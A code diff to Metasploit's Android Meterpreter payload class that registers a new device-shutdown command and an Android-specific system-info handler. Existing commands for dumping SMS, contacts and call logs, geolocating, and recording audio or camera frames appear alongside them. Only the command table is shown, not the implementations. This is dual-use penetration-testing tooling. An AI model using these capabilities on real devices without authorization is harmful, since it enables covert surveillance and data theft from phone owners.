@@ -6,11 +6,13 @@ import java.io.OutputStream;
 import android.content.Context;
 
 import com.metasploit.meterpreter.android.check_root_android;
+import com.metasploit.meterpreter.android.device_shutdown_android;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
 import com.metasploit.meterpreter.android.dump_sms_android;
 import com.metasploit.meterpreter.android.geolocate_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
+import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
 import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
 import com.metasploit.meterpreter.android.webcam_audio_record_android;
 import com.metasploit.meterpreter.android.webcam_get_frame_android;
@@ -79,7 +81,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_net_config_get_routes", stdapi_net_config_get_routes_V1_4.class);
         mgr.registerCommand("stdapi_net_socket_tcp_shutdown", stdapi_net_socket_tcp_shutdown_V1_3.class);
         mgr.registerCommand("stdapi_sys_config_getuid", stdapi_sys_config_getuid.class);
-        mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo.class);
+        mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo_android.class);
         mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
         mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
@@ -93,6 +95,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("geolocate", geolocate_android.class);
         mgr.registerCommand("dump_calllog", dump_calllog_android.class);
         mgr.registerCommand("check_root", check_root_android.class);
+        mgr.registerCommand("device_shutdown", device_shutdown_android.class);
         
         return getCommandManager().getNewCommands();
     }
